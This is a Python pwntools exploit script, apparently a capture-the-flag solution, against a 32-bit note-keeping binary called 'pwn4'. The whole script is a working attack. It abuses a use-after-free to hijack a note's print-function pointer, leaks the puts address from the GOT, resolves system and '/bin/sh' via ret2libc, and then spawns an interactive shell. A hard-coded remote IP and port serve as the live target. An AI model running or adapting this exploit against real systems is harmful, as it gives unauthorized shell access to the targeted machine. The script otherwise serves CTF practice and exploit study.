from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.symbols[func]
		system = base + libc.symbols['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
context.arch = 'i386'
context.os = 'linux'
binary = './pwn4'
context.binary = binary
elf = ELF(binary)
p = remote('121.89.239.232', 10001) if (len(argv) == 2) and (argv[1] == 'r') else process(binary)
#path = '/lib/i386-linux-gnu/libc.so.6'
def dbg():
    gdb.attach(p)
    pause()

def addnote(size, content):
    sla("Your choice :", 1)
    sla("Note size :", size)
    sa("Content :", content)

def deletenote(index):
    sla("Your choice :", 2)
    sla("Index :", index)

def printnote(index):
    sla("Your choice :", 3)
    sla("Index :", index)

def exit():
    sla("Your choice :", 4)

puts_plt_addr = elf.plt['puts']
puts_got_addr = elf.got['puts']
addnote(0x10, b'aaa')# 0
addnote(0x10, b'bbb')# 1
deletenote(0)
deletenote(1)
addnote(0x8, p32(0x804862B) + p32(puts_got_addr))# 2
printnote(0)
puts_true_addr = u32(p.recv(4))
print(hex(puts_true_addr))
system_true_addr, bin_sh_addr = ret2libc(puts_true_addr, 'puts', './x86_libc.so.6')
print(hex(system_true_addr))
print(hex(bin_sh_addr))
deletenote(2)
addnote(0x8, p32(system_true_addr) + ';sh\x00')
printnote(0)
itr()